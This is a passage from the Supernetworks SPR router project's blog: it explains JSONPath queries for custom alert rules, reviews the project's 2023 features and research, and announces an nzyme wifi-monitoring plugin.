<img loading="lazy" alt="alerts-custom" src="/pages/assets/images/jsonpath-com-6305b9073dcaaccfd840112a45dc3895.jpg" width="2568" height="856" class="img_ev3q"></p>
<p>So suppose we have an array of events, we can build a filter expression to query for matches.</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    &quot;MAC&quot;: &quot;30:58:90:32:7d:e5&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    &quot;Reason&quot;: &quot;mismatch&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    &quot;Status&quot;: &quot;&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    &quot;Type&quot;: &quot;wpa&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    &quot;time&quot;: &quot;2024-02-02T04:10:19.511662376Z&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    &quot;bucket&quot;: &quot;wifi:auth:fail&quot;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    &quot;MeaningOfLife&quot;: 42</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To pull out events with MeaningOfLife 42, we would apply this query:</p>
<div class="language-JSONPath language-jsonpath codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsonpath codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$[?(@.MeaningOfLife==42)]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We could also use other mathematical comparisons</p>
<div class="language-JSONPath language-jsonpath codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsonpath codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$[?(@.MeaningOfLife&gt;0)]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Or with gval we can even add numbers</p>
<div class="language-JSONPath language-jsonpath codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsonpath codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$[?(@.MeaningOfLife&gt;(1+10))]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Other useful ways to match are regular expressions on strings:</p>
<div class="language-JSONPath language-jsonpath codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsonpath codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$[?(@.Reason=~&quot;^mismatch$&quot;)]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jsonpath-in-spr">JSONPath in SPR<a href="#jsonpath-in-spr" class="hash-link" aria-label="Direct link to JSONPath in SPR" title="Direct link to JSONPath in SPR">​</a></h3>
<p>The best part is we don&#x27;t need a SQL schema to get started. JSONPath work for all of the events in SPR.
It may seem a bit intimidating at first, and we hide out some of the extra syntax <code>$[?@(.)]</code>. However,
this provides a lot of flexibility and is relatively easy once you get the hang of it.</p>
<p><img loading="lazy" alt="alerts-custom" src="/pages/assets/images/alert-custom-5193040408fcedefce9a3c9d82bea448.png" width="2826" height="2014" class="img_ev3q"></p>
<p>To simplify rule writing we allow multiple JSONPath queries and provide toggles
for inverting logic as well as Match One (OR) or Match Any (AND). Each JSONPath query can match on multiple fields too.</p>
<p>The JSONPath query language is also available under the events search view for searching.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="customizability--decorators">Customizability &amp; Decorators<a href="#customizability--decorators" class="hash-link" aria-label="Direct link to Customizability &amp; Decorators" title="Direct link to Customizability &amp; Decorators">​</a></h2>
<p>Alerts can Notify in the UI or they can sit on the Alerts page for triaging. When defining an alert,
users can fill out the &#x27;Title&#x27; and &#x27;Body&#x27; for the alert to display. These support a templating language,
for populating text with fields from the Alert Event. Furthermore, we&#x27;ve added a few decorators with hashtags
to convert identifiers to device icons or go from something like a MAC address to a device name or IP Address.</p>
<p>Templates expand event fields inside of curly brackets as elow:
<code> MAC Mismatch IP Violation {{IP.SrcIP#Device}} {{IP.SrcIP}} {{Ethernet.SrcMAC}} to {{IP.DstIP}} {{Ethernet.DstMAC}}</code></p>
<p>Check out the guide for more details about <a href="/pages/docs/guides/alerts">how to configure alerts</a>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="need-a-feature">Need a feature?<a href="#need-a-feature" class="hash-link" aria-label="Direct link to Need a feature?" title="Direct link to Need a feature?">​</a></h2>
<p>If you&#x27;d like to see more added or have a question, don&#x27;t hesitate to file a github issue or reach out on our discord</p>
<p><img loading="lazy" alt="alerts-overview" src="/pages/assets/images/alerts-overview-d5e7da7dec59633aa0c6ddc31986bf74.png" width="2880" height="1562" class="img_ev3q"></p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/spr">SPR</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/alerts">alerts</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/jpath">jpath</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/events">events</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="What a year it&#x27;s been for the Secure Programmable Router (SPR) project! We&#x27;ve made great strides in empowering users to take control of their networks, prioritize privacy, and unlock network configurability. Let&#x27;s dive right into the highlights of 2023 and peek at what&#x27;s in store for the future."><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/pages/blog/spr-2023-in-review">2023 Year in Review</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2023-12-27T00:00:00.000Z" itemprop="datePublished">December 27, 2023</time> · <!-- -->5 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/defendtheworld" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Alex Radocea</span></a></div></div></div></div><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/capslcc" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Philip Olausson</span></a></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><p><strong>What a year it&#x27;s been for the Secure Programmable Router (SPR) project!</strong> We&#x27;ve made great strides in empowering users to take control of their networks, prioritize privacy, and unlock network configurability. Let&#x27;s dive right into the highlights of 2023 and peek at what&#x27;s in store for the future.</p>
<p><img loading="lazy" alt="device-list" src="/pages/assets/images/demo-screenshot-4fada3be970ecc66a3ac005cc64907e2.png" width="3002" height="1370" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="major-accomplishments">Major Accomplishments:<a href="#major-accomplishments" class="hash-link" aria-label="Direct link to Major Accomplishments:" title="Direct link to Major Accomplishments:">​</a></h3>
<ul>
<li><strong>iOS App Launch:</strong> We&#x27;ve extended network management to your fingertips with the release of our official <a href="https://apps.apple.com/us/app/secure-programmable-router/id6443709201" target="_blank" rel="noopener noreferrer">iOS app on the App Store</a>. We&#x27;re thankful to our users from almost each and every region on the App Store.</li>
<li><strong>PLUS Membership:</strong> Our community now has the option to support the project <a href="https://www.supernetworks.org/plus.html" target="_blank" rel="noopener noreferrer">with PLUS</a> and unlock advanced features like:<!-- -->
<ul>
<li>Mesh networking for seamless coverage with multiple APs</li>
<li>Site VPN support for selectively routing traffic through a remote Wireguard VPN</li>
<li>Advanced firewall rules with scheduling, domain name, and regular expression support</li>
</ul>
</li>
<li><strong>Shipping Dev Kits</strong>. After the global supply chain crunch, we&#x27;re proud to be shipping <a href="https://www.supernetworks.org/devkit.html" target="_blank" rel="noopener noreferrer">dev kits</a> to users</li>
<li><strong>Microsegmentation for Containers:</strong> We&#x27;ve taken SPR&#x27;s container support to the next level with integrated container microsegmentation, enabling granular control over container and interface traffic.</li>
<li><strong>VLAN Trunk Support:</strong> SPR can work as a wired firewall as well. Connect devices to your SPR network securely through a managed switch, with SPR terminating a VLAN Trunk Port.</li>
<li><strong>Expanded Network Visibility:</strong> Our new <a href="https://github.com/spr-networks/sprbus" target="_blank" rel="noopener noreferrer">event bus</a>, database, and configurable alerting mechanism provide key insights into network activity, empowering users to detect and troubleshoot issues effectively and analyze IOT &amp; device traffic.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="thank-you-to-our-users">Thank you to our users!<a href="#thank-you-to-our-users" class="hash-link" aria-label="Direct link to Thank you to our users!" title="Direct link to Thank you to our users!">​</a></h3>
<ul>
<li>
<p><strong>We Build For You:</strong> We&#x27;re incredibly grateful for our active user base and their invaluable suggestions. Your feedback drives our development roadmap! Join the conversation on Discord or create a GitHub request to share your ideas. Many of SPR&#x27;s capabilities come from requests. Some of the feature requests that have landed are wifi scanning from the UI, the <code>lan_upstream</code> tag for restricting and managing access to upstream local networks to enable <a href="https://www.supernetworks.org/pages/blog/secure%20router%20chaining" target="_blank" rel="noopener noreferrer">secure router chaining</a>, and load balancing support across multiple Uplink interfaces.</p>
</li>
<li>
<p><strong>Privacy and Ad Blocking Excellence:</strong> SPR continues to excel as a self-hosted WireGuard + DNS Ad block solution, offering unmatched configurability with per-device rules, easy exception management, and upstream DNS over HTTPS support for enhanced privacy. Users can get these capabilities by <a href="https://www.supernetworks.org/pages/blog/virtual-spr-1click" target="_blank" rel="noopener noreferrer">self hosting in the cloud</a> as well as running SPR at home as a router.</p>
</li>
<li>
<p><strong>Network Debugging Made Easy:</strong> Users have been able to use SPR to successfully debug connectivity issues with devices like Ring cameras, pinpointing problems with Amazon&#x27;s cloud services rather than home Wi-Fi although Ring may say otherwise.</p>
</li>
<li>
<p><strong>Uncovering Unauthorized Access:</strong> Event logs have helped users identify and address unauthorized access attempts, including scenarios like accidental connections from new neighbors moving in.</p>
</li>
<li>
<p><strong>Speedier WiFi:</strong> Even with our Raspberry Pi dev kits, users report impressive speeds between <code>500-700 Mbps</code> over USB3, surpassing their previous routers. With MT7915/6 cards, SPR users today can enjoy actual WiFi 6 gigabit <code>(1000+ Mbps)</code> connectivity over 2 spatial streams as measured with iperf3.</p>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="technical-research">Technical Research:<a href="#technical-research" class="hash-link" aria-label="Direct link to Technical Research:" title="Direct link to Technical Research:">​</a></h3>
<ul>
<li>
<p><strong>Unscathed by MacStealer:</strong> SPR&#x27;s design was further validated by the <a href="https://github.com/vanhoefm/macstealer" target="_blank" rel="noopener noreferrer">MacStealer (CVE-2022-47522)</a> flaws. MacStealer bypassed most Client Isolation approaches due to state errors in low level firmware with MAC address handling. SPR&#x27;s per-device VLAN and per-device password approach is totally immune to this category of protocol flaws.</p>
</li>
<li>
<p><strong>Research AP in Scapy:</strong> We&#x27;ve developed functional WPA2 AP research scripts in Scapy for working with Wi-Fi frames, compatible with mac80211_hwsim and real wireless cards. (<a href="https://github.com/spr-networks/barely-ap" target="_blank" rel="noopener noreferrer">https://github.com/spr-networks/barely-ap</a>).</p>
</li>
<li>
<p><strong>Turtles WiFi Hacking</strong> While waiting for the supply chain to unlock at the start of the year, we put together some wifi security training focused on protocol. We actually let people boot a kernel for a self hosted wireless lab, in the browser. Or people can play offline in containers. This is a bit different than other labs which teach people to run prebuilt software as we guide people towards working at the packet level. <a href="https://www.supernetworks.org/wifiturtles.html" target="_blank" rel="noopener noreferrer">Check it out here</a></p>
</li>
</ul>
<p><img loading="lazy" alt="device-list" src="/pages/assets/images/turtles-5733351d9bbcd250b9fa7b3f4c034ea5.png" width="3106" height="2028" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2023s-hardware-in-pictures">2023&#x27;s Hardware In Pictures<a href="#2023s-hardware-in-pictures" class="hash-link" aria-label="Direct link to 2023&#x27;s Hardware In Pictures" title="Direct link to 2023&#x27;s Hardware In Pictures">​</a></h3>
<p><img loading="lazy" alt="pi4" src="/pages/assets/images/yellow-pi-case-a6d3fa980bc9e4e7dba63b83781bc34e.png" width="1200" height="1200" class="img_ev3q">
<em>Pi4 with a Mediatek MT76-based USB3 Adapter</em></p>
<p><img loading="lazy" alt="pi4" src="/pages/assets/images/clearfog-6795a1eac2a1694b5731b8ee02677e84.png" width="3728" height="1182" class="img_ev3q">
<em>Solidrun Clearfog Dev Kit</em></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-road-ahead">The Road Ahead:<a href="#the-road-ahead" class="hash-link" aria-label="Direct link to The Road Ahead:" title="Direct link to The Road Ahead:">​</a></h3>
<ul>
<li><strong>Empowering Plugins:</strong> Our next major focus is facilitating community-built plugins. We&#x27;ve already created prototypes for <a href="https://github.com/spr-networks/spr-tailscale" target="_blank" rel="noopener noreferrer">Tailscale support</a> and <a href="https://github.com/spr-networks/spr-mitmproxy" target="_blank" rel="noopener noreferrer">mitmproxy</a>, and we&#x27;re working on UI integration and streamlined installation to make plugin usage as seamless as possible without sacrificing security.</li>
<li><strong>PI5 Router with WiFi-6:</strong> Our next hardware device will be a a PI5-based router packaged with wifi-6 support.</li>
<li><strong>Eliminating firmware risk</strong> We&#x27;re also <a href="https://www.supernetworks.org/pages/blog/barely-ap-surfaces" target="_blank" rel="noopener noreferrer">developing software</a> to eliminate firmware attack surfaces with WiFi.</li>
</ul>
<p><strong>Join the Movement:</strong></p>
<p>We invite you to be part of the SPR journey! Contribute to development, share your feedback, and help us shape the future of open-source networking. Together, we can build a more secure, private, and customizable internet experience for everyone.</p>
<p><strong>Visit our <a href="https://www.supernetworks.rog" target="_blank" rel="noopener noreferrer">website</a> and <a href="https://github.com/spr-networks/super" target="_blank" rel="noopener noreferrer">GitHub repository</a> to learn more and get involved</strong></p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/spr">SPR</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/ios">IOS</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/microsegmentation">microsegmentation</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/plus">PLUS</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="Nzyme lets people monitor their wifi networks with sensors that collect wifi data (as well as network traffic)."><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/pages/blog/spr-nzyme-tap">Loading an nzyme tap on SPR</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2023-11-16T00:00:00.000Z" itemprop="datePublished">November 16, 2023</time> · <!-- -->One min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/defendtheworld" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Alex Radocea</span></a></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><p><a href="https://www.nzyme.org/" target="_blank" rel="noopener noreferrer">Nzyme</a> lets people monitor their wifi networks with sensors that collect wifi data (as well as network traffic).</p>
<p>It can detect common wifi attack tools and tactics like deauths for getting WPA2 handshakes to crack,
rogue APs, and more.</p>
<p>We&#x27;ve put together a plugin that can run alongside the SPR AP without affecting the channels, by creating a monitor interface. While this won&#x27;t be able to detect Rogue APs, it can detect some anomalous activity.</p>
<p>The plugin is available at <a href="https://github.com/spr-networks/spr-nzyme-tap/" target="_blank" rel="noopener noreferrer">https://github.com/spr-networks/spr-nzyme-tap/</a></p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/wifi">wifi</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/nzyme">nzyme</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/defense">defense</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/blue-team">blue-team</a></li></ul></div></footer></article><nav class="pagination-nav" aria-label="Blog list page navigation"><a class="pagination-nav__link pagination-nav__link--next" href="/pages/blog/page/2"><div class="pagination-nav__label">Older Entries</div></a></nav></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">SPR Links</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/pages/">SPR Homepage</a></li><li class="footer__item"><a class="footer__link-item" href="/pages/docs/intro">Documentation</a></li></ul></div><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://discord.gg/EUjTKJPPAX" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://twitter.com/spr_networks" target="_blank" rel="noopener noreferrer" class="footer__link-item">Twitter<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title"> </div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/pages/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/spr-networks/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2024 Supernetworks, Inc. Built with Docusaurus.</div></div></div></footer></div>
<script>!function(){function t(){const t=document.querySelectorAll("div.markdown");Array.from(t).filter((t=>"blogPost"===t.parentNode.getAttribute("itemprop"))).forEach((t=>{if(!t.nextSibling||!t.nextSibling.classList.contains("custom-section")){const e=document.createElement("div");e.classList.add("custom-section"),e.innerHTML='\n          <br/>\n<br/>\n<h3>Connect with the SPR Community</h3>\n<ul>\n  <li><b>Get in the loop</b>: <a href="https://sendfox.com/supernetworks">Subscribe</a> to our Newsletter</li>\n  <li><b>Collaborate</b>:  <a href="https://github.com/spr-networks/super">Check out</a> our GitHub</li>\n  <li><b>Chat with us</b>: <a href="https://discord.gg/EUjTKJPPAX">Join our Discord</a> or <a href="https://twitter.com/spr_networks">Follow us</a> on Twitter</li>\n</ul>\n<br/>\n\n        ',t.parentNode.insertBefore(e.cloneNode(!0),t.nextSibling)}}))}new MutationObserver(((e,o)=>{document.querySelector("article")&&t()})).observe(document,{childList:!0,subtree:!0}),t()}()</script></body>
</html>